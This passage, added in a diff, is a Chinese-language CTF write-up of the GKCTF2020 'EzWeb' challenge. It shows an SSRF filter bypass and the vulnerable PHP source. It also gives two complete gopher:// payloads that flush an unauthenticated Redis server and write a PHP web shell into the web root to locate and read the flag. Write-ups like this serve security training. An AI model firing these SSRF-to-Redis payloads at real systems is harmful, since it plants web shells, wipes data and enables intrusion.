@@ -1838,3 +1838,91 @@ echo urlencode(serialize($c));
 
 
 
+## [GKCTF2020]EZ三剑客-EzWeb
+
+##### SSRF
+
+打开题目
+
+![image-20201223182110711](Buuoj-WEB-Write-up/image-20201223182110711.png)
+
+跟url有关，可能是ssrf，命令执行等，先输入`127.0.0.1&whoami`
+
+![image-20201223182233706](Buuoj-WEB-Write-up/image-20201223182233706.png)
+
+被ban，查看源码发现提示`?secret`
+
+![image-20201223182323977](Buuoj-WEB-Write-up/image-20201223182323977.png)
+
+发现是linux命令`ifconfig`内容，考点应该是ssrf打内网
+
+尝试用`file:/`读取文件发现被ban，使用 `file：/`、`file:<空格>///` 绕过
+
+读到源码
+
+```php
+<?php
+function curl($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    echo curl_exec($ch);
+    curl_close($ch);
+}
+
+if(isset($_GET['submit'])){
+		$url = $_GET['url'];
+		//echo $url."\n";
+		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
+		{
+			//var_dump($match);
+			die('别这样');
+		}
+		curl($url);
+}
+if(isset($_GET['secret'])){
+	system('ifconfig');
+}
+?>
+```
+
+ban了`file://`，`dict://`，`127.0.0.1`和`localhost`，应该是要找本机的服务，爆破下内网同网段下存活主机
+
+![image-20201223182749451](Buuoj-WEB-Write-up/image-20201223182749451.png)
+
+![image-20201223182807801](Buuoj-WEB-Write-up/image-20201223182807801.png)
+
+在`10.138.132.10`发现提示，爆破其端口，猜测为mysql，redis之类的服务
+
+![image-20201223184447546](Buuoj-WEB-Write-up/image-20201223184447546.png)
+
+在6379端口发现异常，至此明白为redis漏洞
+
+尝试打redis未授权访问漏洞
+
+payload:
+
+```php
+gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+```
+
+在目标主机上生成`shell.php`，扫描`fla*`，以确定flag位置
+
+![image-20201223184856356](Buuoj-WEB-Write-up/image-20201223184856356.png)
+
+排除其他可能，确认flag在根目录，再打
+
+```php
+gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+```
+
+`cat /flag`
+
+![image-20201223185801498](Buuoj-WEB-Write-up/image-20201223185801498.png)
+
+
+
+---
+
+
+
